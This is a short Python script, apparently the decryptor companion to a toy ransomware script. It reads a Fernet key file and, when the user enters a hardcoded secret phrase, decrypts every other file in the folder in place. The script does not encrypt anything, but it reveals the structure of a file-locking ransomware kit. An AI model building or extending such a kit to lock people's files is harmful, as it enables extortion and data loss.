#!/usr/bin/env python3

import os

from cryptography.fernet import Fernet

files = []

for file in os.listdir():

	if file == "ransomeware.py" or file == "thekey.key" or file == "decrypt.py" :

		continue

	if os.path.isfile(file):

		files.append(file)

print(files)

with open("thekey.key", "rb") as key:

	secretkey = key.read()

secretphrase = "hecker"

user_phrase = input("Enter the Secret Phrase to Decrypt your Files \n")

if user_phrase == secretphrase:

	for file in files:

		with open(file, "rb") as thefile:

			contents = thefile.read()

		contents_decrypted = Fernet(secretkey).decrypt(contents)

		with open(file, "wb") as thefile:

			thefile.write(contents_decrypted)

		print("Your Files are Decrypted Successfully")

else:

	print("WRONG SECRET PHRASE !")


